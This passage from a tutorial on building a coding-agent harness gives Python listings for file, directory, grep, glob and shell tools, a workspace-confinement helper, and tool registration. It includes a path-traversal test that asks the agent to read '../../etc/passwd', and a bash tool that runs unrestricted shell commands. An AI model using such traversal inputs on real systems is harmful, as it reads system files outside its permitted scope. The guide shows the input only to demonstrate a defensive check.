right listing without needing to know the absolute path. It mirrors how a developer
would open a terminal in the project root.

### ▶ Run it now

```python
run("Run 'echo Hello from bash' as a shell command and tell me what it printed.")
```

You should see `bash` called with that command and the output echoed back.

---

## Step 2.7 — Version 2, complete: the whole harness in one file

You have built every piece across Steps 2.0–2.6. Here is **Version 2 as one complete,
runnable program** — the harness, the two safety helpers, and the four core tools
(`read_file`, `write_file`, `list_dir`, `bash`) with their hand-written schema dicts and
the dispatch dict. Still no classes, no decorators.

```python
# harness_v2.py
"""Version 2 — the same harness, tools as plain functions.

Four core tools (read_file, write_file, list_dir, bash), two shared
safety helpers, one dispatch dict.  No classes, no decorators.
"""

import json
import os
import pathlib
import subprocess

from openai import OpenAI

client = OpenAI()   # reads OPENAI_API_KEY from the environment

# ── Safety helpers (Step 2.3) ────────────────────────────────────────────────

WORKSPACE_ROOT = pathlib.Path(os.getcwd()).resolve()

def _safe_path(user_path: str) -> pathlib.Path:
    """Resolve user_path inside WORKSPACE_ROOT or raise ValueError."""
    p = pathlib.Path(user_path)
    if p.is_absolute():
        p = WORKSPACE_ROOT / pathlib.Path(*p.parts[1:])
    else:
        p = WORKSPACE_ROOT / p
    resolved = p.resolve()
    try:
        resolved.relative_to(WORKSPACE_ROOT)
    except ValueError:
        raise ValueError(
            f"Path '{user_path}' resolves outside the workspace root '{WORKSPACE_ROOT}'."
        )
    return resolved

def _truncate(text: str, max_chars: int = 40_000, max_lines: int = 2_000,
              label: str = "output") -> str:
    """Cap text at max_lines / max_chars with a visible notice."""
    lines = text.splitlines(keepends=True)
    if len(lines) > max_lines:
        text = "".join(lines[:max_lines])
        text += f"\n[... {label} truncated at {max_lines} lines ...]"
    if len(text) > max_chars:
        text = text[:max_chars] + f"\n[... {label} truncated at {max_chars} chars ...]"
    return text

# ── Tools (Steps 2.0, 2.1, 2.4, 2.6) ─────────────────────────────────────────

def read_file(path: str) -> str:
    """Read a text file and return its contents, or an ERROR string."""
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
    except FileNotFoundError:
        return f"ERROR: File not found: {path}"
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    return _truncate(text, label=f"read_file({path})")

def write_file(path: str, content: str) -> str:
    """Write content to a file, creating it (and parent dirs) if needed."""
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    return f"Wrote {len(encoded)} bytes ({content.count(chr(10))} lines) to '{path}'."

def list_dir(path: str = ".") -> str:
    """List the contents of a directory."""
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: Directory not found: {path}"
    if not p.is_dir():
        return f"ERROR: '{path}' is a file, not a directory."
    # Tuple sort key: False < True, so dirs (is_file()=False) come first, then by name.
    entries = sorted(p.iterdir(), key=lambda e: (e.is_file(), e.name.lower()))
    lines = []
    for e in entries:
        if e.is_dir():
            lines.append(f"D  {e.name}/")
        else:
            lines.append(f"F  {e.name}  ({e.stat().st_size} bytes)")
    return _truncate(f"Directory: {path}\n" + "\n".join(lines), label="list_dir")

def bash(command: str, timeout: int = 120) -> str:
    """Run a shell command; return exit code plus combined stdout/stderr."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"
    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"

# ── Schemas: one hand-written dict per tool ──────────────────────────────────

SCHEMAS = [
    {
        "type": "function",
        "name": "read_file",
        "description": "Read a text file and return its contents. Returns an ERROR string on failure.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path relative to the workspace root."},
            },
            "required": ["path"],
        },
    },
    {
        "type": "function",
        "name": "write_file",
        "description": (
            "Write content to a file, creating it (and parent directories) if needed. "
            "Overwrites existing files completely."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path relative to the workspace root."},
                "content": {"type": "string", "description": "Full text content to write."},
            },
            "required": ["path", "content"],
        },
    },
    {
        "type": "function",
        "name": "list_dir",
        "description": "List the files and directories at a path, one entry per line.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Directory path. Default '.'."},
            },
            "required": [],
        },
    },
    {
        "type": "function",
        "name": "bash",
        "description": (
            "Run a shell command in the workspace and return its exit code and combined "
            "output. stdin is closed, so interactive commands will not work."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Shell command to execute."},
                "timeout": {"type": "integer", "description": "Seconds before the command is killed. Default 120."},
            },
            "required": ["command"],
        },
    },
]

TOOL_FNS = {
    "read_file": read_file,
    "write_file": write_file,
    "list_dir": list_dir,
    "bash": bash,
}

# ── The harness (unchanged from Version 1, except dict dispatch) ─────────────

def run(task: str) -> None:
    input_items = [{"role": "user", "content": task}]
    while True:
        resp = client.responses.create(
            model="gpt-4o",
            input=input_items,
            tools=SCHEMAS,
        )
        for item in resp.output:
            input_items.append(
                item.model_dump() if hasattr(item, "model_dump") else item
            )
        tool_calls = [item for item in resp.output
                      if getattr(item, "type", None) == "function_call"]
        if not tool_calls:
            for item in resp.output:
                if getattr(item, "type", None) == "message":
                    for block in item.content:
                        if getattr(block, "type", None) == "output_text":
                            print("ANSWER:", block.text)
            return
        for tc in tool_calls:
            args = json.loads(tc.arguments) if isinstance(tc.arguments, str) else tc.arguments
            print(f"[tool] {tc.name}({args})")
            fn = TOOL_FNS.get(tc.name)
            result = fn(**args) if fn else f"ERROR: Unknown tool: {tc.name}"
            input_items.append({
                "type": "function_call_output",
                "call_id": tc.call_id,
                "output": result,
            })

if __name__ == "__main__":
    run("List the files here, create notes.txt containing the word 'hello', "
        "then run 'cat notes.txt' with bash and confirm the file says hello.")
```

The other three tools you built — `glob` (Step 2.1), `grep` (Step 2.2), and `edit_file`
(Step 2.5) — slot in identically: paste each function above the schemas, write its schema
dict, add one `TOOL_FNS` entry. Nothing else moves.

### ▶ Run it now

```bash
python harness_v2.py
```

You should see a short tool-call chain — `list_dir`, then `write_file`, then `bash` —
ending with an answer confirming `notes.txt` contains `hello`. Also re-try the Version 1
escape: ask it to read `../../etc/passwd` and watch `_safe_path` turn the attempt into an
`ERROR: Path ... resolves outside the workspace root` string the model can see and
explain. (An absolute path like `/etc/hostname` behaves differently: `_safe_path`
*re-roots* it under the workspace — `/etc/hostname` becomes `<workspace>/etc/hostname` —
so that attempt fails with an ordinary `ERROR: File not found` instead of tripping the
guard. Either way, nothing outside the workspace is read.)

---

## Version 3 — the organized toolset: the same idea, organized

### What changed from V2 to V3

- The tool functions and helpers move out of the harness script into **one module**
  (`coding_tools.py`) with the workspace root defined once at the top.
- The hand-written schema dicts disappear: the **`@tool` decorator from Phase 2** derives
  each schema from the function's type hints and docstring, making registration one line
  per tool.
- The `TOOL_FNS` dict becomes the Phase 2 **`ToolRegistry`**: `registry.to_openai_schema()`
  feeds the API call and `registry.dispatch(name, arguments_json)` replaces the manual
  lookup (Phase 2's dispatch takes the **raw JSON string** and does its own `json.loads`).
- Confinement is enforced **centrally**: every path-taking tool funnels through
  `_safe_path`, and the workspace root is set in exactly one place
  (`make_default_registry(workspace=...)`, or `set_workspace()` in the package).
- The tools gain production polish: line numbers and `offset`/`limit` paging in
  `read_file`, result caps in `glob`/`grep`/`list_dir`, binary-file detection.
- The harness loop **still does not change** — it consumes `registry.to_openai_schema()`
  and `registry.dispatch()`, and the `call_id` handshake is identical.

**Why now?** You have all seven tools working individually as plain functions. Version 3
assembles them the way the consolidated package does: one module, central confinement,
and the Phase 2 `@tool` / `ToolRegistry` machinery doing the bookkeeping — so the rest of
the program can use tools by name without knowing which function each name maps to.

This is just the Phase 2 `ToolRegistry` pattern applied to the full toolset. If you
skipped Phase 2, think of the registry as a dict from tool name → function, plus a method
that produces the `tools=[...]` list for the API call.

## Step 3.0 — A two-minute bridge: wiring Version 3 against your real Phase 2 code

> **Why now?** Everything from here to the end of the phase imports the tool system you
> built in Phase 2. Three wiring facts keep that painless — get them straight once and
> every listing below runs against your existing code with **zero changes** to Phase 2:
>
> 1. **The import line.** Phase 2's tool system lives in a **`tools/` package** (a
>    directory with `__init__.py`, `base.py`, `registry.py`, `parallel.py`), not a
>    single `registry.py` file. So the import is:
>
>    ```python
>    from tools import tool, ToolRegistry   # Phase 2's tools/ package
>    ```
>
>    and the class is named **`ToolRegistry`** (there is no class called `Registry`).
>
> 2. **The file name for this phase's module.** We will collect all seven tools into one
>    module. Do **not** name it `tools.py`: saved next to your Phase 2 `tools/` package,
>    `import tools` would resolve to the package directory and your file would be
>    shadowed. We use **`coding_tools.py`** throughout. (The consolidated package avoids
>    the clash differently — it puts these same tools *inside* the package, as
>    `tools/files.py` and `tools/shell.py`.)
>
> 3. **The two method names you'll call.** The schema list for the API comes from
>    `registry.to_openai_schema()` (that is Phase 2's name for it), and dispatch is
>    `registry.dispatch(name, arguments_str)` where `arguments_str` is the **raw JSON
>    string** from the model (`tc.arguments`) — Phase 2's dispatch does its own
>    `json.loads` and validation, so do *not* parse the arguments into a dict first.
>    One bonus: because `@tool` wraps each function in a `FunctionTool` object,
>    `registry.register(read_file)` just works — the decorated name *is* a `Tool`.

That is the whole bridge — no code to change in Phase 2, just the right names. Your
project folder for the rest of this phase looks like:

```text
project/
├── tools/              # Phase 2, unchanged (base.py, registry.py, parallel.py, __init__.py)
├── coding_tools.py     # this phase's toolset (complete listing at the end of this phase)
└── demo_phase4.py      # the Version 3 harness (Step 3.3)
```

## Step 3.1 — Upgrade tools to use `@tool` and `ToolRegistry`

In the full `coding_tools.py` module (the
[end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)),
every tool function carries the
`@tool` decorator from Phase 2. The decorator reads the function's type hints and
docstring and automatically writes the schema dict — so you do not have to maintain
`READ_FILE_SCHEMA` by hand any more.

> [!WARNING]
> **What the model actually sees of your docstrings.** Phase 2's
> `_parse_google_docstring` keeps only the **first line** of each `Args:` entry — the
> indented continuation lines under a parameter never make it into the schema. So in
> the lovingly multi-line docstrings below, only each parameter's first line reaches
> the model; put the load-bearing facts (defaults, units, gotchas) there, and treat the
> continuation lines as documentation for *humans* reading the source. To check what
> the model receives, print it — e.g. `from coding_tools import grep` then
> `print(grep.parameters)` — and you will see exactly where each description is cut.

## Step 3.2 — `make_default_registry`

```python
def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
    """
    Return a ToolRegistry pre-loaded with all coding-agent tools.

    Args:
        workspace: Override WORKSPACE_ROOT for this session.  If None, the
                   module-level WORKSPACE_ROOT (defaulting to cwd) is used.

    Usage:
        from coding_tools import make_default_registry
        registry = make_default_registry(pathlib.Path("/my/project"))
        # Pass registry.to_openai_schema() to client.responses.create(tools=...)
        # Answer each call with registry.dispatch(tc.name, tc.arguments) —
        # tc.arguments is the raw JSON string; dispatch parses it itself.
    """
    global WORKSPACE_ROOT
    if workspace is not None:
        WORKSPACE_ROOT = workspace.resolve()

    registry = ToolRegistry()
    for fn in (read_file, write_file, edit_file, bash, glob, grep, list_dir):
        registry.register(fn)
    return registry
```

The `ToolRegistry` class from Phase 2 already knows how to produce the flat tool-schema
list and dispatch by name. All we do here is register every `@tool`-decorated function.
The `@tool` decorator extracted the JSON schema from type hints and the docstring when
the function was defined, so there is nothing more to do.

> 🟢 **What `global WORKSPACE_ROOT` does.** Normally, assigning to a name inside a
> function creates a *new local variable* that vanishes when the function returns. The
> `global WORKSPACE_ROOT` line tells Python "no — when I assign to `WORKSPACE_ROOT` in
> here, change the *module-level* variable at the top of the file." That is the whole
> mechanism by which `make_default_registry(workspace=...)` re-points every tool at a
> new workspace: all the tools read the same module-level `WORKSPACE_ROOT`, and this one
> assignment changes what they all see. (Reading a global never needs the keyword —
> only *assigning* to one does.)

---

## Version 3 reference — module layout and shared utilities

> **Reference section.** From here to the end-to-end demo, nothing new runs — these
> sections describe the production-ready `coding_tools.py` layout, the rest of
> Version 3. You have already met all the pieces above; here they are explained in
> their final assembled form. Skim for the named differences, or skip ahead to
> [Step 3.3 — the end-to-end demo](#step-33--the-end-to-end-demo).

All tools live in a single module `coding_tools.py` (recall from Step 3.0 why the name
is not `tools.py`: that would be shadowed by Phase 2's `tools/` package directory). At
the top of the module we establish the workspace root, the two shared helpers, and the
imports.

```python
# coding_tools.py
"""
Phase 4 — Real-world tools for a coding agent.

All tools use the @tool decorator and ToolRegistry from Phase 2's tools/ package.
All I/O is pure stdlib. No third-party packages.
"""

from __future__ import annotations

import fnmatch
import os
import pathlib
import re
import subprocess

from tools import tool, ToolRegistry   # Phase 2's tools/ package (base.py + registry.py)

# ---------------------------------------------------------------------------
# Workspace root
# ---------------------------------------------------------------------------
# Every path argument is resolved relative to WORKSPACE_ROOT.  Set this to
# the project directory the agent is allowed to operate in.  It defaults to
# the current working directory at import time.
#
# Override before calling make_default_registry():
#   import coding_tools; coding_tools.WORKSPACE_ROOT = pathlib.Path("/my/project")

WORKSPACE_ROOT: pathlib.Path = pathlib.Path(os.getcwd()).resolve()
```

**This mirrors the consolidated package.** `code/agent_harness/tools/files.py` and
`shell.py` organize confinement exactly this way: a module-level `_WORKSPACE_ROOT`, a
small `set_workspace(path)` setter, and a `_safe_path` that every path-taking tool
funnels through — so the boundary is enforced **centrally, in one place**, not
re-implemented inside each tool. The guide's equivalent of the package's setter is two
lines:

```python
def set_workspace(path: pathlib.Path) -> None:
    """Point every tool at a new workspace root (the package's files.py/shell.py pattern)."""
    global WORKSPACE_ROOT
    WORKSPACE_ROOT = pathlib.Path(path).resolve()
```

`make_default_registry(workspace=...)` (Step 3.2) calls the same idea inline. One
subtlety worth stealing from the package: its `_safe_path` rejects escapes with
`Path.is_relative_to()`, **not** a string `startswith` check — a plain prefix
comparison would let a sibling directory like `/ws-evil` slip through for workspace
`/ws`. Our `resolved.relative_to(WORKSPACE_ROOT)` + `except ValueError` form is the
pre-3.9-friendly spelling of the same test.

---

## Version 3 reference — the production tools

> **Reference copy.** These are the same seven functions you built in Steps 2.0–2.6,
> now using `@tool`, `_safe_path`, and `_truncate`. The logic is identical; only the
> decorators, shared helpers, and some production polish (line-numbered paging in
> `read_file`, result caps, binary-file detection) have been added. Nothing new to type
> here — skim or skip. The maintained versions live in
> [code/agent_harness/tools/files.py](./code/agent_harness/tools/files.py) and
> [shell.py](./code/agent_harness/tools/shell.py).

### `read_file` (production form)

```python
@tool
def read_file(path: str, offset: int = 0, limit: int = 2000) -> str:
    """
    Read a text file and return its contents with line numbers.

    Args:
        path:   Path to the file, relative to the workspace root.
        offset: First line to return (0-indexed).  Default 0 (start of file).
        limit:  Maximum number of lines to return.  Default 2000.

    Returns:
        File contents formatted as 'lineN\\tcontent', one line per row — the
        same format as `cat -n`.  If the file is missing, unreadable, or
        appears to be binary, returns an ERROR string.

    Use offset/limit to page through large files:
        read_file("big.log", offset=2000, limit=2000)   # lines 2000-3999
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"

    # Read raw bytes first so we can detect binary files cheaply.
    try:
        raw = p.read_bytes()
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

    # Heuristic binary check: any null bytes in the first 8 KB → binary.
    if b"\x00" in raw[:8192]:
        size = len(raw)
        return (
            f"ERROR: '{path}' appears to be a binary file ({size} bytes). "
            "Use bash('xxd ...') or bash('file ...') to inspect it."
        )

    text = raw.decode("utf-8", errors="replace")
    lines = text.splitlines()
    total = len(lines)

    # Apply offset/limit slice.
    sliced = lines[offset : offset + limit]
    if not sliced:
        return (
            f"File '{path}' has {total} lines. "
            f"offset={offset} is past the end of the file."
        )

    # Format with line numbers (1-indexed, matching editor conventions).
    _LINE_NUM_WIDTH = len(str(offset + len(sliced)))
    numbered = "\n".join(
        f"{offset + i + 1:{_LINE_NUM_WIDTH}d}\t{line}"
        for i, line in enumerate(sliced)
    )

    header = f"File: {path}  (lines {offset + 1}–{offset + len(sliced)} of {total})\n"
    result = header + numbered

    return _truncate(result, label=f"read_file({path})")
```

**Design note — why line numbers?**
The `edit_file` tool (next section) uses exact string matching, not line numbers. But the
model still needs line numbers to reason about its own edits: "the function starts at line
42, so the `old_string` I should use is lines 42–55". Without numbers the model must count
manually and frequently miscounts in long files. Line numbers also let the model construct
precise `old_string` values that are unique by virtue of being large enough to cover the
surrounding context.

**Design note — offset/limit pagination.**
A model that wants to read a 10,000-line file does not need all 10,000 lines at once.
The `offset` and `limit` parameters let it scan in windows, requesting only the region
it cares about. The tool itself caps the returned text with `_truncate` as a backstop,
but idiomatic agent usage is to request a small window first and page forward as needed.

---

### `write_file` (production form)

```python
@tool
def write_file(path: str, content: str) -> str:
    """
    Write content to a file, creating it (and any parent directories) if it
    does not exist.  Overwrites the file completely if it does exist.

    Args:
        path:    Path to the file, relative to the workspace root.
        content: Full text content to write.  UTF-8 encoded.

    Returns:
        A confirmation string showing the number of bytes and lines written,
        or an ERROR string if the write failed.

    WARNING: This is a destructive operation.  The previous file contents are
    not recoverable once overwritten.  For targeted changes to an existing file
    prefer edit_file(), which performs a surgical replacement and verifies the
    old content exists before writing.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"

    lines = content.count("\n")
    return (
        f"Wrote {len(encoded)} bytes ({lines} lines) to '{path}'."
    )
```

---

### `edit_file` (production form) — the surgical edit tool

```python
@tool
def edit_file(
    path: str,
    old_string: str,
    new_string: str,
    replace_all: bool = False,
) -> str:
    """
    Replace an exact string in a file with a new string.

    The tool reads the file, verifies that old_string appears in the content,
    and writes the file back with old_string replaced by new_string.

    Args:
        path:        Path to the file, relative to the workspace root.
        old_string:  The exact text to find and replace.  Must match the file
                     contents character-for-character, including whitespace and
                     indentation.  Include enough surrounding context (e.g. the
                     full function signature plus a few lines) to make the match
                     unique.
        new_string:  The text to substitute in place of old_string.
        replace_all: If False (default), the tool returns an error if old_string
                     appears more than once in the file — ambiguous edits are
                     rejected.  If True, all occurrences are replaced.

    Returns:
        A confirmation string, or one of:
          ERROR: File not found          — path does not exist
          ERROR: old_string not found    — no match; check whitespace/indentation
          ERROR: old_string is ambiguous — N matches found, replace_all=False
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"

    try:
        original = p.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"

    count = original.count(old_string)

    if count == 0:
        # Give the model actionable guidance.
        snippet = repr(old_string[:120]) + ("..." if len(old_string) > 120 else "")
        return (
            f"ERROR: old_string not found in '{path}'.\n"
            f"Searched for: {snippet}\n"
            "Check that whitespace and indentation exactly match the file contents. "
            "Use read_file() to inspect the exact bytes."
        )

    if count > 1 and not replace_all:
        return (
            f"ERROR: old_string is ambiguous — found {count} occurrences in '{path}'. "
            "Provide more surrounding context to make old_string unique, "
            "or pass replace_all=True to replace every occurrence."
        )

    updated = original.replace(old_string, new_string)

    try:
        p.write_text(updated, encoding="utf-8")
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"

    replacements = count if replace_all else 1
    # splitlines() counts actual lines correctly whether or not the file
    # ends with a trailing newline (count("\n") + 1 would over-report by one).
    lines_before = len(original.splitlines())
    lines_after = len(updated.splitlines())
    delta = lines_after - lines_before
    delta_str = f"+{delta}" if delta >= 0 else str(delta)
    return (
        f"Edited '{path}': replaced {replacements} occurrence(s). "
        f"File now has {lines_after} lines ({delta_str} from before)."
    )
```

---

### `bash` (production form) — shell command execution

```python
@tool
def bash(command: str, timeout: int = 120) -> str:
    """
    Run a shell command and return its output (stdout and stderr combined).

    Args:
        command: The shell command to execute.  Runs under /bin/sh so shell
                 features (pipes, redirects, &&, subshells) work normally.
        timeout: Maximum seconds to wait for the command to finish.  Default
                 120.  Commands that exceed this are killed and an error is
                 returned.

    Returns:
        A string of the form:
            Exit code: 0
            ---
            <combined stdout + stderr>

        On timeout:
            ERROR: Command timed out after N seconds: <command>

    IMPORTANT — SECURITY:
        This tool executes arbitrary shell commands with the permissions of the
        agent process.  Do not expose it to untrusted input without a permission
        layer (Phase 5).  It runs with shell=True so shell injection is possible
        if user-supplied data is interpolated into the command string.

    IMPORTANT — BLOCKING:
        Interactive commands (e.g. 'python3 -i', 'vim') will hang until the
        timeout fires because stdin is closed.  Use non-interactive invocations:
        'python3 script.py' not 'python3 -i'.

    Working directory:
        Commands run with cwd=WORKSPACE_ROOT so relative paths in the command
        work as expected within the project.
    """
    try:
        result = subprocess.run(
            command,
            shell=True,                   # We want a real shell for pipes etc.
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,     # Never block waiting for input.
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,     # Merge stderr into stdout.
            timeout=timeout,
            # Do NOT use text=True here; some commands emit binary (e.g. xxd).
            # Decode ourselves with errors='replace'.
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"

    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"
```

---

### `glob` (production form)

```python
@tool
def glob(pattern: str, path: str = ".") -> str:
    """
    Find files matching a glob pattern.

    Args:
        pattern: A glob pattern, e.g. '**/*.py', '*.md', 'src/**/*.ts'.
                 Use '**' for recursive matching.
        path:    Directory to search in, relative to workspace root.
                 Default '.' (workspace root).

    Returns:
        A sorted, newline-separated list of matching paths relative to the
        workspace root.  Returns a message if no files match.  Caps at 500
        results.
    """
    _MAX_RESULTS = 500

    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not base.exists():
        return f"ERROR: Directory not found: {path}"
    if not base.is_dir():
        return f"ERROR: Not a directory: {path}"

    try:
        # Path.glob handles '**' natively (recursive match), so '**/*.py'
        # finds Python files at every depth — no special-casing needed.
        matches = list(base.glob(pattern))
    except (OSError, ValueError) as exc:
        return f"ERROR: Glob failed: {exc}"

    # Keep only files (not directories) and sort for determinism.
    file_matches = sorted(
        [m for m in matches if m.is_file()],
        key=lambda p: str(p),
    )

    truncated = False
    if len(file_matches) > _MAX_RESULTS:
        file_matches = file_matches[:_MAX_RESULTS]
        truncated = True

    if not file_matches:
        return f"No files match pattern '{pattern}' under '{path}'."

    # Return paths relative to workspace root for readability.
    rel_paths = []
    for m in file_matches:
        try:
            rel_paths.append(str(m.relative_to(WORKSPACE_ROOT)))
        except ValueError:
            rel_paths.append(str(m))

    result = "\n".join(rel_paths)
    if truncated:
        result += f"\n[... capped at {_MAX_RESULTS} results ...]"
    return result
```

**Why a dedicated `glob` tool?**

The alternative is `bash("find . -name '*.py'")`. That works but has two problems:
(1) the model must remember `find` syntax, which varies between Linux and macOS;
(2) every `bash` call is a subprocess fork with a Phase 5 permission prompt in
production. `glob` is pure Python, instant, and safe — no subprocess, no shell, no
permission needed. Reserve `bash` for operations that genuinely require the shell.

---

### `grep` (production form)

```python
@tool
def grep(pattern: str, path: str = ".", glob_filter: str | None = None) -> str:
    """
    Search file contents for a regular expression pattern.

    Args:
        pattern:     Python re pattern to search for.  Case-sensitive by
                     default.  Wrap in (?i) for case-insensitive.
        path:        File or directory to search, relative to workspace root.
                     If a file, searches that file only.
                     If a directory, searches recursively.  Default '.'.
        glob_filter: If given, only files whose name matches this glob are
                     searched, e.g. '*.py'.  Only the filename
                     (not the full path) is matched.

    Returns:
        Matching lines in the format 'filepath:linenum: line content', one
        per row — the same format as grep -n.  Returns a message if no
        matches.  Caps at 200 matching lines.
    """
    _MAX_RESULTS = 200
    _MAX_FILE_BYTES = 5 * 1024 * 1024  # Skip files larger than 5 MB.

    try:
        compiled = re.compile(pattern)
    except re.error as exc:
        return f"ERROR: Invalid regex pattern: {exc}"

    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not base.exists():
        return f"ERROR: Path not found: {path}"

    # Collect files to search.
    if base.is_file():
        files_to_search = [base]
    else:
        files_to_search = [f for f in base.rglob("*") if f.is_file()]

    # Apply glob filter on filename (not full path).
    if glob_filter:
        import fnmatch
        files_to_search = [
            f for f in files_to_search
            if fnmatch.fnmatch(f.name, glob_filter)
        ]

    files_to_search = sorted(files_to_search, key=lambda p: str(p))

    results = []
    skipped_binary = 0
    skipped_large = 0

    for filepath in files_to_search:
        if len(results) >= _MAX_RESULTS:
            break

        # Skip large files.
        try:
            size = filepath.stat().st_size
        except OSError:
            continue
        if size > _MAX_FILE_BYTES:
            skipped_large += 1
            continue

        # Read and decode.
        try:
            raw = filepath.read_bytes()
        except OSError:
            continue

        # Skip binary files.
        if b"\x00" in raw[:8192]:
            skipped_binary += 1
            continue

        text = raw.decode("utf-8", errors="replace")

        # Search line by line.
        for lineno, line in enumerate(text.splitlines(), start=1):
            if len(results) >= _MAX_RESULTS:
                break
            if compiled.search(line):
                try:
                    rel = str(filepath.relative_to(WORKSPACE_ROOT))
                except ValueError:
                    rel = str(filepath)
                # Truncate very long matching lines to keep output readable.
                display_line = line[:300] + ("..." if len(line) > 300 else "")
                results.append(f"{rel}:{lineno}: {display_line}")

    if not results:
        msg = f"No matches for pattern '{pattern}'"
        if glob_filter:
            msg += f" in files matching '{glob_filter}'"
        msg += f" under '{path}'."
        return msg

    output = "\n".join(results)
    suffix_parts = []
    if len(results) >= _MAX_RESULTS:
        suffix_parts.append(f"results capped at {_MAX_RESULTS}")
    if skipped_binary:
        suffix_parts.append(f"{skipped_binary} binary file(s) skipped")
    if skipped_large:
        suffix_parts.append(f"{skipped_large} large file(s) (>{_MAX_FILE_BYTES // 1024 // 1024} MB) skipped")
    if suffix_parts:
        output += "\n[" + "; ".join(suffix_parts) + "]"

    return output
```

**Why a built-in `grep` beats `bash("grep -rn ...")`.**

Same argument as for `glob`, but stronger: the model needs to search file contents
constantly (finding a function definition, locating a TODO, understanding an import
graph). Every `bash` grep is a subprocess fork, a shell parse, and — in production — a
permission prompt. The built-in `grep` tool is:

- **Instant** — pure Python, no subprocess.
- **Safe** — no command injection, no shell.
- **Portable** — works identically on Linux and macOS.
- **Controlled** — the result cap and binary/large-file skipping are enforced
  regardless of how the model calls it.

The tradeoff is that it does not support the full `grep` flag set (e.g., `-l`, `-v`,
`--include`). For advanced filtering the model can fall back to `bash("grep ...")`.

---

### `list_dir` (production form)

```python
@tool
def list_dir(path: str = ".") -> str:
    """
    List the contents of a directory.

    Args:
        path: Path to the directory, relative to the workspace root.
              Default '.' (workspace root).

    Returns:
        One entry per line: '[type] name  (size)' where type is 'F' for file
        or 'D' for directory.  Sorted alphabetically, directories first.
        Returns an ERROR string if path does not exist or is not a directory.
    """
    _MAX_ENTRIES = 300

    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"

    if not p.exists():
        return f"ERROR: Directory not found: {path}"
    if p.is_file():
        return f"ERROR: '{path}' is a file, not a directory. Use read_file() to read it."

    try:
        entries = list(p.iterdir())
    except PermissionError as exc:
        return f"ERROR: Permission denied: {exc}"
    except OSError as exc:
        return f"ERROR: Cannot list directory: {exc}"

    dirs = sorted([e for e in entries if e.is_dir()], key=lambda e: e.name.lower())
    files = sorted([e for e in entries if e.is_file()], key=lambda e: e.name.lower())
    ordered = dirs + files

    truncated = False
    if len(ordered) > _MAX_ENTRIES:
        ordered = ordered[:_MAX_ENTRIES]
        truncated = True

    lines = []
    for entry in ordered:
        if entry.is_dir():
            lines.append(f"D  {entry.name}/")
        else:
            try:
                size = entry.stat().st_size
                size_str = _human_size(size)
            except OSError:
                size_str = "?"
            lines.append(f"F  {entry.name:<40s}  {size_str:>8s}")

    header = f"Directory: {path}  ({len(dirs)} dirs, {len(files)} files)\n"
    result = header + "\n".join(lines)
    if truncated:
        result += f"\n[... capped at {_MAX_ENTRIES} entries ...]"
    return result


def _human_size(n: int) -> str:
    """Format byte count as a human-readable string."""
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"
```

---

## Version 3 reference — registering everything: `make_default_registry`

> **Reference copy.** This is Step 3.2's `make_default_registry`, unchanged — shown
> again in its place at the bottom of the assembled module.

```python
def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
    """
    Return a ToolRegistry pre-loaded with all coding-agent tools.

    Args:
        workspace: Override WORKSPACE_ROOT for this session.  If None, the
                   module-level WORKSPACE_ROOT (defaulting to cwd) is used.

    Usage:
        from coding_tools import make_default_registry
        registry = make_default_registry(pathlib.Path("/my/project"))
        # Pass registry.to_openai_schema() to client.responses.create(tools=...)
        # Answer each call with registry.dispatch(tc.name, tc.arguments) —
        # tc.arguments is the raw JSON string; dispatch parses it itself.
    """
